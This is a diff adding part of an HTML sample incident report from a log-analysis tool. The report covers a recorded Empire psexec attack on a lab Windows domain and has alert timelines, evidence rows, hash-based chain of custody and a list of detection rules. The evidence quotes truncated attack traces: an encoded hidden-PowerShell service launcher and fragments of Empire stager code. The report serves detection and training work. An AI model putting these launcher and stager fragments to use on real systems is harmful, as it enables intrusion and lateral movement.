+  <div><b>2020-09-20 16:16:58Z</b> <span class="sev sev-high">high</span> <b>Suspicious Command Execution</b> <span class="muted">ALERT-000004 · 7 matches until 2020-09-20 16:16:58Z</span></div>
+  <div>Suspicious command execution (cmd.exe) on WORKSTATION6.theshire.local</div>
+  <div class="kv"><span class="tag">ATT&amp;CK T1059 Command and Scripting Interpreter · Execution</span></div>
+  <div class="kv muted"><span>indicator=<code>cmd.exe</code></span><span>message=<code>A process has exited. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION6$ Account Domain: THESHIRE Logon ID: 0x3E7 Process Information: Process ID: 0x2344 Process Name: C:\Windows\System32\cmd.exe Exit Status: 0x0</code></span><span>source=<code>WORKSTATION6.theshire.local</code></span></div>
+  
+  <table><thead><tr><th>Evidence line</th><th>Time</th><th>Source</th><th>Parsed message</th></tr></thead><tbody>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1226</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">A new process has been created. Creator Subject: Security ID: S-1-5-18 Account Name: WORKSTATION6$ Account Domain: THESHIRE Logon ID: 0x3E7 Target Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Process Information: New Process ID: 0x2344 New Process Name: C:\Windows\System32\cmd.exe Token Elevation Type: %%1936 Mandatory Label: S-1-16-16384 Creator Process ID: 0x2c0  … [&#43;6328 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1230</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">The handle to an object was closed. Subject : Security ID: S-1-5-18 Account Name: WORKSTATION6$ Account Domain: THESHIRE Logon ID: 0x3E7 Object: Object Server: Security Handle ID: 0x1fd0 Process Information: Process ID: 0x2344 Process Name: C:\Windows\System32\cmd.exe</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1233</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">A handle to an object was requested. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION6$ Account Domain: THESHIRE Logon ID: 0x3E7 Object: Object Server: Security Object Type: Key Object Name: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa Handle ID: 0x7c Resource Attributes: - Process Information: Process ID: 0x2344 Process Name: C:\Windows\System32\cmd.exe Access Request Information: T … [&#43;174 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1235</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">An attempt was made to access an object. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION6$ Account Domain: THESHIRE Logon ID: 0x3E7 Object: Object Server: Security Object Type: Key Object Name: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa Handle ID: 0x7c Resource Attributes: - Process Information: Process ID: 0x2344 Process Name: C:\Windows\System32\cmd.exe Access Request Informatio … [&#43;45 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1237</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">The handle to an object was closed. Subject : Security ID: S-1-5-18 Account Name: WORKSTATION6$ Account Domain: THESHIRE Logon ID: 0x3E7 Object: Object Server: Security Handle ID: 0x7c Process Information: Process ID: 0x2344 Process Name: C:\Windows\System32\cmd.exe</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1238</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">A new process has been created. Creator Subject: Security ID: S-1-5-18 Account Name: WORKSTATION6$ Account Domain: THESHIRE Logon ID: 0x3E7 Target Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Process Information: New Process ID: 0x10d8 New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Token Elevation Type: %%1936 Mandatory Label: S-1-16-16 … [&#43;6314 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1239</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">A process has exited. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION6$ Account Domain: THESHIRE Logon ID: 0x3E7 Process Information: Process ID: 0x2344 Process Name: C:\Windows\System32\cmd.exe Exit Status: 0x0</td></tr>
+  
+  </tbody></table>
+</li>
+<li>
+  <div><b>2020-09-20 16:16:58Z</b> <span class="sev sev-high">high</span> <b>Sigma: Service Installed That Runs Encoded PowerShell</b> <span class="muted">ALERT-000005</span></div>
+  <div>Sigma rule &#34;Service Installed That Runs Encoded PowerShell&#34; matched on WORKSTATION6.theshire.local</div>
+  <div class="kv"><span class="tag">ATT&amp;CK T1569.002 · Execution</span></div>
+  <div class="kv muted"><span>sigma_description=<code>A new service (System 7045) whose binary path launches PowerShell with an encoded command. Remote service creation like this is how PsExec-style tools and Empire&#39;s psexec module execute on another host.</code></span><span>sigma_file=<code>rules\sigma\win_service_install_encoded_powershell.yml</code></span><span>sigma_id=<code>3c8d2e1f-6a7b-4e9c-b0d1-5f2a8c7e6d33</code></span><span>sigma_level=<code>high</code></span><span>source=<code>WORKSTATION6.theshire.local</code></span></div>
+  
+  <table><thead><tr><th>Evidence line</th><th>Time</th><th>Source</th><th>Parsed message</th></tr></thead><tbody>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1251</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">A service was installed in the system. Service Name: Updater Service File Name: %COMSPEC% /C start /b C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABlADIAPQBbAHIARQBGAF0ALgBBAFMAcwBlAE0AQgBsAHkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEA … [&#43;4954 chars]</td></tr>
+  
+  </tbody></table>
+</li>
+</ol>
+</section>
+
+<section class="incident" id="INC-00003">
+<header><h3>INC-00003</h3><span class="sev sev-critical">critical</span>
+<span class="muted">2020-09-20 16:17:01Z → 2020-09-20 16:18:20Z</span>
+<span class="tag">T1059</span><span class="tag">T1190</span></header>
+<div class="muted mono">host=WORKSTATION6</div>
+<ol class="timeline">
+<li>
+  <div><b>2020-09-20 16:17:01Z</b> <span class="sev sev-high">high</span> <b>Suspicious Command Execution</b> <span class="muted">ALERT-000006 · 150 matches until 2020-09-20 16:18:20Z</span></div>
+  <div>Suspicious command execution (powershell) on WORKSTATION6</div>
+  <div class="kv"><span class="tag">ATT&amp;CK T1059 Command and Scripting Interpreter · Execution</span></div>
+  <div class="kv muted"><span>indicator=<code>powershell</code></span><span>message=<code>Pipeline execution details for command line: $taskURI = $script:TaskURIs | Get-Random . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=269 UserId=THESHIRE\SYSTEM HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=e8e13192-f9bd-4c67-a1a0-08b3ee074ba9 HostApplication=C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUA … [&#43;5473 chars]</code></span><span>related_logs_truncated=<code>true</code></span><span>source=<code>WORKSTATION6</code></span></div>
+  
+  <table><thead><tr><th>Evidence line</th><th>Time</th><th>Source</th><th>Parsed message</th></tr></thead><tbody>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1741</td><td>2020-09-20 16:17:01Z</td><td>WORKSTATION6</td><td class="mono">Provider &#34;Registry&#34; is Started. Details: ProviderName=Registry NewProviderState=Started SequenceNumber=1 HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=e8e13192-f9bd-4c67-a1a0-08b3ee074ba9 HostApplication=C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJA … [&#43;5073 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1744</td><td>2020-09-20 16:17:01Z</td><td>WORKSTATION6</td><td class="mono">Provider &#34;Alias&#34; is Started. Details: ProviderName=Alias NewProviderState=Started SequenceNumber=3 HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=e8e13192-f9bd-4c67-a1a0-08b3ee074ba9 HostApplication=C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMA … [&#43;5067 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1746</td><td>2020-09-20 16:17:01Z</td><td>WORKSTATION6</td><td class="mono">Provider &#34;Environment&#34; is Started. Details: ProviderName=Environment NewProviderState=Started SequenceNumber=5 HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=e8e13192-f9bd-4c67-a1a0-08b3ee074ba9 HostApplication=C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwAp … [&#43;5079 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1748</td><td>2020-09-20 16:17:01Z</td><td>WORKSTATION6</td><td class="mono">Provider &#34;FileSystem&#34; is Started. Details: ProviderName=FileSystem NewProviderState=Started SequenceNumber=7 HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=e8e13192-f9bd-4c67-a1a0-08b3ee074ba9 HostApplication=C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAH … [&#43;5077 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1751</td><td>2020-09-20 16:17:01Z</td><td>WORKSTATION6</td><td class="mono">Provider &#34;Function&#34; is Started. Details: ProviderName=Function NewProviderState=Started SequenceNumber=9 HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=e8e13192-f9bd-4c67-a1a0-08b3ee074ba9 HostApplication=C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJA … [&#43;5073 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1753</td><td>2020-09-20 16:17:01Z</td><td>WORKSTATION6</td><td class="mono">Provider &#34;Variable&#34; is Started. Details: ProviderName=Variable NewProviderState=Started SequenceNumber=11 HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=e8e13192-f9bd-4c67-a1a0-08b3ee074ba9 HostApplication=C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJ … [&#43;5074 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1755</td><td>2020-09-20 16:17:01Z</td><td>WORKSTATION6</td><td class="mono">Engine state is changed from None to Available. Details: NewEngineState=Available PreviousEngineState=None SequenceNumber=13 HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=e8e13192-f9bd-4c67-a1a0-08b3ee074ba9 HostApplication=C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC … [&#43;5142 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:2225</td><td>2020-09-20 16:17:02Z</td><td>WORKSTATION6</td><td class="mono">Pipeline execution details for command line: fUNctIOn Start-NEGotiaTE {pARAm($s,$SK,$UA=&#39;MOzilLA/5.0 (WiNDOws NT 6.1; WOW64; TridENT/7.0; rv:11.0) LIKe GEcKo&#39;,$HoP)fuNCtion COnveRTTO-RC4BYTEStreAm {PARAM ($RCK, $IN)BegIn {[ByTE[]] $STr = 0..255;$J = 0;0..255 | FOrEAch-ObJECt {$J = ($J &#43; $STr[$_] &#43; $RCK[$_ % $RCK.Length]) % 256;$StR[$_], $StR[$J] = $StR[$J], $STr[$_];};$I = $J = 0;}pROCeSs {FOrEaCh … [&#43;16133 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:2226</td><td>2020-09-20 16:17:02Z</td><td>WORKSTATION6</td><td class="mono">Pipeline execution details for command line: fUNctIOn Start-NEGotiaTE {pARAm($s,$SK,$UA=&#39;MOzilLA/5.0 (WiNDOws NT 6.1; WOW64; TridENT/7.0; rv:11.0) LIKe GEcKo&#39;,$HoP)fuNCtion COnveRTTO-RC4BYTEStreAm {PARAM ($RCK, $IN)BegIn {[ByTE[]] $STr = 0..255;$J = 0;0..255 | FOrEAch-ObJECt {$J = ($J &#43; $STr[$_] &#43; $RCK[$_ % $RCK.Length]) % 256;$StR[$_], $StR[$J] = $StR[$J], $STr[$_];};$I = $J = 0;}pROCeSs {FOrEaCh … [&#43;16104 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:2227</td><td>2020-09-20 16:17:02Z</td><td>WORKSTATION6</td><td class="mono">Pipeline execution details for command line: fUNctIOn Start-NEGotiaTE {pARAm($s,$SK,$UA=&#39;MOzilLA/5.0 (WiNDOws NT 6.1; WOW64; TridENT/7.0; rv:11.0) LIKe GEcKo&#39;,$HoP)fuNCtion COnveRTTO-RC4BYTEStreAm {PARAM ($RCK, $IN)BegIn {[ByTE[]] $STr = 0..255;$J = 0;0..255 | FOrEAch-ObJECt {$J = ($J &#43; $STr[$_] &#43; $RCK[$_ % $RCK.Length]) % 256;$StR[$_], $StR[$J] = $StR[$J], $STr[$_];};$I = $J = 0;}pROCeSs {FOrEaCh … [&#43;16119 chars]</td></tr>
+  <tr><td colspan="4" class="muted">+40 more cited lines, listed in the JSON report</td></tr>
+  </tbody></table>
+</li>
+<li>
+  <div><b>2020-09-20 16:17:02Z</b> <span class="sev sev-critical">critical</span> <b>Injection Pattern Detected</b> <span class="muted">ALERT-000007 · 35 matches until 2020-09-20 16:18:20Z</span></div>
+  <div>Command Injection pattern detected from WORKSTATION6</div>
+  <div class="kv"><span class="tag">ATT&amp;CK T1190 Exploit Public-Facing Application · Initial Access</span></div>
+  <div class="kv muted"><span>attack_type=<code>Command Injection</code></span><span>message=<code>Pipeline execution details for command line: $IV=[BitConverter]::GetBytes($(Get-Random)); . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=261 UserId=THESHIRE\SYSTEM HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=e8e13192-f9bd-4c67-a1a0-08b3ee074ba9 HostApplication=C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8Ab … [&#43;5263 chars]</code></span><span>source=<code>WORKSTATION6</code></span></div>
+  
+  <table><thead><tr><th>Evidence line</th><th>Time</th><th>Source</th><th>Parsed message</th></tr></thead><tbody>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:2225</td><td>2020-09-20 16:17:02Z</td><td>WORKSTATION6</td><td class="mono">Pipeline execution details for command line: fUNctIOn Start-NEGotiaTE {pARAm($s,$SK,$UA=&#39;MOzilLA/5.0 (WiNDOws NT 6.1; WOW64; TridENT/7.0; rv:11.0) LIKe GEcKo&#39;,$HoP)fuNCtion COnveRTTO-RC4BYTEStreAm {PARAM ($RCK, $IN)BegIn {[ByTE[]] $STr = 0..255;$J = 0;0..255 | FOrEAch-ObJECt {$J = ($J &#43; $STr[$_] &#43; $RCK[$_ % $RCK.Length]) % 256;$StR[$_], $StR[$J] = $StR[$J], $STr[$_];};$I = $J = 0;}pROCeSs {FOrEaCh … [&#43;16133 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:2226</td><td>2020-09-20 16:17:02Z</td><td>WORKSTATION6</td><td class="mono">Pipeline execution details for command line: fUNctIOn Start-NEGotiaTE {pARAm($s,$SK,$UA=&#39;MOzilLA/5.0 (WiNDOws NT 6.1; WOW64; TridENT/7.0; rv:11.0) LIKe GEcKo&#39;,$HoP)fuNCtion COnveRTTO-RC4BYTEStreAm {PARAM ($RCK, $IN)BegIn {[ByTE[]] $STr = 0..255;$J = 0;0..255 | FOrEAch-ObJECt {$J = ($J &#43; $STr[$_] &#43; $RCK[$_ % $RCK.Length]) % 256;$StR[$_], $StR[$J] = $StR[$J], $STr[$_];};$I = $J = 0;}pROCeSs {FOrEaCh … [&#43;16104 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:2227</td><td>2020-09-20 16:17:02Z</td><td>WORKSTATION6</td><td class="mono">Pipeline execution details for command line: fUNctIOn Start-NEGotiaTE {pARAm($s,$SK,$UA=&#39;MOzilLA/5.0 (WiNDOws NT 6.1; WOW64; TridENT/7.0; rv:11.0) LIKe GEcKo&#39;,$HoP)fuNCtion COnveRTTO-RC4BYTEStreAm {PARAM ($RCK, $IN)BegIn {[ByTE[]] $STr = 0..255;$J = 0;0..255 | FOrEAch-ObJECt {$J = ($J &#43; $STr[$_] &#43; $RCK[$_ % $RCK.Length]) % 256;$StR[$_], $StR[$J] = $StR[$J], $STr[$_];};$I = $J = 0;}pROCeSs {FOrEaCh … [&#43;16119 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:2228</td><td>2020-09-20 16:17:02Z</td><td>WORKSTATION6</td><td class="mono">Pipeline execution details for command line: fUNctIOn Start-NEGotiaTE {pARAm($s,$SK,$UA=&#39;MOzilLA/5.0 (WiNDOws NT 6.1; WOW64; TridENT/7.0; rv:11.0) LIKe GEcKo&#39;,$HoP)fuNCtion COnveRTTO-RC4BYTEStreAm {PARAM ($RCK, $IN)BegIn {[ByTE[]] $STr = 0..255;$J = 0;0..255 | FOrEAch-ObJECt {$J = ($J &#43; $STr[$_] &#43; $RCK[$_ % $RCK.Length]) % 256;$StR[$_], $StR[$J] = $StR[$J], $STr[$_];};$I = $J = 0;}pROCeSs {FOrEaCh … [&#43;16122 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:2229</td><td>2020-09-20 16:17:02Z</td><td>WORKSTATION6</td><td class="mono">Pipeline execution details for command line: fUNctIOn Start-NEGotiaTE {pARAm($s,$SK,$UA=&#39;MOzilLA/5.0 (WiNDOws NT 6.1; WOW64; TridENT/7.0; rv:11.0) LIKe GEcKo&#39;,$HoP)fuNCtion COnveRTTO-RC4BYTEStreAm {PARAM ($RCK, $IN)BegIn {[ByTE[]] $STr = 0..255;$J = 0;0..255 | FOrEAch-ObJECt {$J = ($J &#43; $STr[$_] &#43; $RCK[$_ % $RCK.Length]) % 256;$StR[$_], $StR[$J] = $StR[$J], $STr[$_];};$I = $J = 0;}pROCeSs {FOrEaCh … [&#43;16241 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:2230</td><td>2020-09-20 16:17:02Z</td><td>WORKSTATION6</td><td class="mono">Pipeline execution details for command line: fUNctIOn Start-NEGotiaTE {pARAm($s,$SK,$UA=&#39;MOzilLA/5.0 (WiNDOws NT 6.1; WOW64; TridENT/7.0; rv:11.0) LIKe GEcKo&#39;,$HoP)fuNCtion COnveRTTO-RC4BYTEStreAm {PARAM ($RCK, $IN)BegIn {[ByTE[]] $STr = 0..255;$J = 0;0..255 | FOrEAch-ObJECt {$J = ($J &#43; $STr[$_] &#43; $RCK[$_ % $RCK.Length]) % 256;$StR[$_], $StR[$J] = $StR[$J], $STr[$_];};$I = $J = 0;}pROCeSs {FOrEaCh … [&#43;17938 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:2233</td><td>2020-09-20 16:17:02Z</td><td>WORKSTATION6</td><td class="mono">Pipeline execution details for command line: fUNctIOn Start-NEGotiaTE {pARAm($s,$SK,$UA=&#39;MOzilLA/5.0 (WiNDOws NT 6.1; WOW64; TridENT/7.0; rv:11.0) LIKe GEcKo&#39;,$HoP)fuNCtion COnveRTTO-RC4BYTEStreAm {PARAM ($RCK, $IN)BegIn {[ByTE[]] $STr = 0..255;$J = 0;0..255 | FOrEAch-ObJECt {$J = ($J &#43; $STr[$_] &#43; $RCK[$_ % $RCK.Length]) % 256;$StR[$_], $StR[$J] = $StR[$J], $STr[$_];};$I = $J = 0;}pROCeSs {FOrEaCh … [&#43;16100 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:2241</td><td>2020-09-20 16:17:02Z</td><td>WORKSTATION6</td><td class="mono">Pipeline execution details for command line: fUNctIOn Start-NEGotiaTE {pARAm($s,$SK,$UA=&#39;MOzilLA/5.0 (WiNDOws NT 6.1; WOW64; TridENT/7.0; rv:11.0) LIKe GEcKo&#39;,$HoP)fuNCtion COnveRTTO-RC4BYTEStreAm {PARAM ($RCK, $IN)BegIn {[ByTE[]] $STr = 0..255;$J = 0;0..255 | FOrEAch-ObJECt {$J = ($J &#43; $STr[$_] &#43; $RCK[$_ % $RCK.Length]) % 256;$StR[$_], $StR[$J] = $StR[$J], $STr[$_];};$I = $J = 0;}pROCeSs {FOrEaCh … [&#43;16024 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:2253</td><td>2020-09-20 16:17:02Z</td><td>WORKSTATION6</td><td class="mono">Pipeline execution details for command line: fUNctIOn Start-NEGotiaTE {pARAm($s,$SK,$UA=&#39;MOzilLA/5.0 (WiNDOws NT 6.1; WOW64; TridENT/7.0; rv:11.0) LIKe GEcKo&#39;,$HoP)fuNCtion COnveRTTO-RC4BYTEStreAm {PARAM ($RCK, $IN)BegIn {[ByTE[]] $STr = 0..255;$J = 0;0..255 | FOrEAch-ObJECt {$J = ($J &#43; $STr[$_] &#43; $RCK[$_ % $RCK.Length]) % 256;$StR[$_], $StR[$J] = $StR[$J], $STr[$_];};$I = $J = 0;}pROCeSs {FOrEaCh … [&#43;17234 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:2325</td><td>2020-09-20 16:17:02Z</td><td>WORKSTATION6</td><td class="mono">Pipeline execution details for command line: fUNctIOn Start-NEGotiaTE {pARAm($s,$SK,$UA=&#39;MOzilLA/5.0 (WiNDOws NT 6.1; WOW64; TridENT/7.0; rv:11.0) LIKe GEcKo&#39;,$HoP)fuNCtion COnveRTTO-RC4BYTEStreAm {PARAM ($RCK, $IN)BegIn {[ByTE[]] $STr = 0..255;$J = 0;0..255 | FOrEAch-ObJECt {$J = ($J &#43; $STr[$_] &#43; $RCK[$_ % $RCK.Length]) % 256;$StR[$_], $StR[$J] = $StR[$J], $STr[$_];};$I = $J = 0;}pROCeSs {FOrEaCh … [&#43;16133 chars]</td></tr>
+  <tr><td colspan="4" class="muted">+25 more cited lines, listed in the JSON report</td></tr>
+  </tbody></table>
+</li>
+</ol>
+</section>
+
+
+
+
+<h2>4. Chain of custody</h2>
+<p class="muted">Evidence was opened read-only. Each file is hashed before analysis and re-hashed afterwards; a mismatch means it changed during analysis.</p>
+<table><thead><tr><th>Evidence file</th><th class="n">Bytes</th><th>SHA-256 before / after</th><th>Check</th></tr></thead><tbody>
+<tr><td class="mono">testdata/datasets/mordor/empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json</td><td class="n">12650959</td><td class="mono">968c4b699f7239d106577b2b8e206edfaf812f193a60e663966258af67a56acc<br>968c4b699f7239d106577b2b8e206edfaf812f193a60e663966258af67a56acc</td><td><span class="ok">unchanged</span></td></tr>
+</tbody></table>
+<table><tbody>
+<tr><th>Detection config</th><td class="mono">configs\config.yaml<br>sha256 343124330fa73820ca57ab3f5aa98449cc67423f73ed028c6a0d273c7c563925</td></tr>
+<tr><th>Definition file</th><td class="mono">rules\sigma\lnx_format_string_exploit.yml<br>sha256 604ff56c80ff6e5436c030ee6f7947b2fce69799ee190e550a9ee85d0e73cd7d</td></tr>
+<tr><th>Definition file</th><td class="mono">rules\sigma\win_lsass_access_credential_dump.yml<br>sha256 166b8bc47b6e2d8b049895f4dad958daee10ed53ea6a258dc7bd8f3eecb96f9c</td></tr>
+<tr><th>Definition file</th><td class="mono">rules\sigma\win_service_install_encoded_powershell.yml<br>sha256 7fb5bfaef7d321a68abd05064edb3ce381f85541c64a0ee2310351f8e4dea9a1</td></tr>
+<tr><th>Output</th><td class="mono">drishti-scan-sample.json<br>sha256 8593d4cac4ff9824124d854aadefba17a94c45df79b83672dbf3053a0bde1d67</td></tr>
+<tr><th>Output</th><td class="mono">drishti-scan-sample-alerts.csv<br>sha256 48e44adc87c48fe2e737b6a75fe9fe7a80073678ac09c3ea941e1b9cafebd400</td></tr>
+</tbody></table>
+<p class="muted">This report file is itself hashed in the session_end record of the audit log.</p>
+
+<h2>5. Audit session</h2>
+<table><tbody>
+<tr><th>Session ID</th><td class="mono">7869c7ec6e010758</td></tr>
+<tr><th>Command</th><td class="mono">scan -sigma rules/sigma -output drishti-scan-sample.json -report docs/report/sample-incident-report.html -pdf docs/report/sample-incident-report.pdf testdata/datasets/mordor/empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json</td></tr>
+<tr><th>Analyst (OS user)</th><td>BAWISKAR\VRB on Bawiskar</td></tr>
+<tr><th>Tool</th><td>Drishti Nexus 1.1.0-dev (go1.25.5, windows/amd64)</td></tr>
+<tr><th>Started</th><td>2026-11-01 12:23:47Z</td></tr>
+<tr><th>Report generated</th><td>2026-11-01 12:23:50Z (the session_end record follows in the audit log)</td></tr>
+<tr><th>session_start record hash</th><td class="mono">f7d96d2baf8abe7340489520e9936cffab970b1ee04d162e460b4dc4208eef35</td></tr>
+<tr><th>Normal hours</th><td>09:00-17:00 UTC</td></tr>
+<tr><th>Incident gap</th><td>30m0s</td></tr>
+<tr><th>Adaptive thresholds</th><td>max(static, mean&#43;3σ), α=0.1, after 5 windows of 10m0s</td></tr>
+<tr><th>Assumed timezone</th><td>UTC</td></tr>
+<tr><th>Storage</th><td>memory</td></tr>
+</tbody></table>
+<table><thead><tr><th>Rule</th><th>Enabled</th><th>Severity</th><th class="n">Threshold</th><th>Window</th></tr></thead><tbody>
+<tr><td>Authentication Brute Force</td><td>true</td><td>high</td><td class="n">3</td><td>5m0s</td></tr>
+<tr><td>Excessive Authentication Failures</td><td>true</td><td>medium</td><td class="n">5</td><td>10m0s</td></tr>
+<tr><td>Privilege Escalation Indicator</td><td>true</td><td>medium</td><td class="n">-</td><td>10m0s</td></tr>
+<tr><td>Suspicious Command Execution</td><td>true</td><td>high</td><td class="n">-</td><td>10m0s</td></tr>
+<tr><td>Injection Pattern Detected</td><td>true</td><td>critical</td><td class="n">-</td><td>10m0s</td></tr>
+<tr><td>Time-based Anomaly</td><td>true</td><td>low</td><td class="n">3</td><td>1h0m0s</td></tr>
+<tr><td>Lateral Movement Candidate</td><td>true</td><td>critical</td><td class="n">-</td><td>30m0s</td></tr>
+<tr><td>Sigma: Format String Exploitation Attempt in a Service Log</td><td>true</td><td>critical</td><td class="n">-</td><td>10m0s</td></tr>
+<tr><td>Sigma: LSASS Memory Read With Credential-Dumping Access Rights</td><td>true</td><td>high</td><td class="n">-</td><td>10m0s</td></tr>
+<tr><td>Sigma: Service Installed That Runs Encoded PowerShell</td><td>true</td><td>high</td><td class="n">-</td><td>10m0s</td></tr>
+</tbody></table>
+
+</main>
+</body>
+</html>
